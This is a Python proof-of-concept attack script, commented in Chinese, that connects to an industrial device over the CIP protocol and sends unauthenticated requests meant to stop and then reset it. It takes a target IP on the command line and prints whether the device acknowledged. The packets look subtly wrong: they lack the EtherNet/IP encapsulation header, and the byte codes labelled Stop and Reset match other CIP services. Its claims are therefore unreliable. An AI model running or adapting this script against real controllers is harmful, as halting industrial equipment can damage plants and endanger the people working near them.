"""
CIP PoC: 远程 Stop 攻击 (无认证漏洞)
"""
import socket, struct, sys

def stop(host, port=44819):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5); sock.connect((host, port))
    req = bytes([0x54, 0x02, 0x04, 0x24])
    sock.sendall(req)
    resp = sock.recv(1024)
    if resp and resp[0] == 0xD4:
        print("[!] CIP Stop acknowledged - device stopped!")
        if len(resp) > 2:
            print(f"    Response: {resp.hex()}")
    else:
        print(f"[-] Stop failed: {resp.hex()[:60] if resp else 'no response'}")
    sock.close()

def reset(host, port=44819):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5); sock.connect((host, port))
    req = bytes([0x52, 0x02, 0x04, 0x24])
    sock.sendall(req)
    resp = sock.recv(1024)
    if resp and resp[0] == 0xD2:
        print("[!] CIP Reset acknowledged - device reset!")
    else:
        print(f"[-] Reset: {resp.hex()[:60] if resp else 'no response'}")
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python poc/cip_stop.py <target_ip> [port]"); sys.exit(1)
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 44819
    stop(sys.argv[1], port)
    reset(sys.argv[1], port)
